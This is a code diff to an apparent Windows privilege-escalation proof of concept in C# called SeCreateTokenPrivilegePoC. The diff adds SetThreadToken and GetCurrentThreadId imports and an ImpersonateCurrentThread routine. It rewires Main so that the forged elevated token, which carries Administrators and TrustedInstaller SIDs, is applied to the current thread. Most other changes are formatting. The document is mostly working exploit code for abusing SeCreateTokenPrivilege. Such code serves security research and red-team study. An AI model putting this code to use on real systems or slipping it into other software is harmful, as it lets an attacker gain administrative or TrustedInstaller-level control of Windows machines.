@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
@@ -155,7 +154,7 @@ namespace SeCreateTokenPrivilegePoC
                 get
                 {
                     return (UNICODE_STRING)Marshal.PtrToStructure(
-                     objectName, typeof(UNICODE_STRING));
+                        objectName, typeof(UNICODE_STRING));
                 }
 
                 set
@@ -355,6 +354,11 @@ namespace SeCreateTokenPrivilegePoC
             string lpName,
             ref LUID lpLuid);
 
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool SetThreadToken(
+            IntPtr pHandle,
+            IntPtr hToken);
+
         /*
          * kenel32.dll
          */
@@ -373,6 +377,9 @@ namespace SeCreateTokenPrivilegePoC
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool FreeLibrary(IntPtr hLibModule);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern int GetCurrentThreadId();
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         static extern IntPtr LoadLibrary(string lpFileName);
@@ -476,7 +483,7 @@ namespace SeCreateTokenPrivilegePoC
             }
 
             Console.WriteLine("[*] If you have SeCreateTokenPrivilege, you can create elevated tokens.");
-            Console.WriteLine("[>] Trying to create a elevated token.");
+            Console.WriteLine("[>] Trying to create an elevated token.");
 
             if (!GetCurrentUserSid(out IntPtr pSid))
                 return IntPtr.Zero;
@@ -490,6 +497,7 @@ namespace SeCreateTokenPrivilegePoC
                 error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to allocate LUID.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
                 return IntPtr.Zero;
             }
 
@@ -505,6 +513,7 @@ namespace SeCreateTokenPrivilegePoC
                 error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to get Administrator group SID.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
                 return IntPtr.Zero;
             }
 
@@ -515,6 +524,7 @@ namespace SeCreateTokenPrivilegePoC
                 error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to get Trusted Installer SID.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
                 return IntPtr.Zero;
             }
 
@@ -534,6 +544,7 @@ namespace SeCreateTokenPrivilegePoC
                 pTokenDefaultDacl == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to get current token information.");
+
                 return IntPtr.Zero;
             }
 
@@ -613,6 +624,7 @@ namespace SeCreateTokenPrivilegePoC
             {
                 Console.WriteLine("[-] Failed to create privileged token.");
                 Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
+
                 return IntPtr.Zero;
             }
 
@@ -645,6 +657,7 @@ namespace SeCreateTokenPrivilegePoC
                     error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to lookup {0}.");
                     Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
                     return false;
                 }
 
@@ -679,6 +692,7 @@ namespace SeCreateTokenPrivilegePoC
             if (!status)
             {
                 Marshal.FreeHGlobal(buffer);
+
                 return IntPtr.Zero;
             }
 
@@ -719,6 +733,7 @@ namespace SeCreateTokenPrivilegePoC
                     if (!IsValidSid(pSid))
                     {
                         pSid = IntPtr.Zero;
+
                         return false;
                     }
                 }
@@ -739,6 +754,27 @@ namespace SeCreateTokenPrivilegePoC
         }
 
 
+        static bool ImpersonateCurrentThread(IntPtr hToken)
+        {
+            int error;
+            Console.WriteLine("[>] Trying to set an impersonation token to current thread.");
+            Console.WriteLine("    |-> Current Thread ID : {0}", GetCurrentThreadId());
+            
+            if (!SetThreadToken(IntPtr.Zero, hToken))
+            {
+                error = Marshal.GetLastWin32Error();
+                Console.WriteLine("[-] Failed to set thread token.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return false;
+            }
+
+            Console.WriteLine("[+] An impersonation token is set successfully.");
+
+            return true;
+        }
+
+
         static void ZeroMemory(IntPtr buffer, int size)
         {
             byte[] nullBytes = new byte[size];
@@ -754,14 +790,20 @@ namespace SeCreateTokenPrivilegePoC
         {
             IntPtr hToken = CreatePrivilegedToken();
 
-            if (hToken != IntPtr.Zero)
-            {
-                Console.WriteLine("[+] Got handle to the elevated token (hToken = 0x{0}).", hToken.ToString("X"));
-                Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
-                Console.ReadLine();
+            if (hToken == IntPtr.Zero)
+                return;
 
+            Console.WriteLine("[+] Got handle to the elevated token (hToken = 0x{0}).", hToken.ToString("X"));
+
+            if (!ImpersonateCurrentThread(hToken))
+            {
                 CloseHandle(hToken);
+
+                return;
             }
+
+            Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
+            Console.ReadLine();
         }
     }
 }
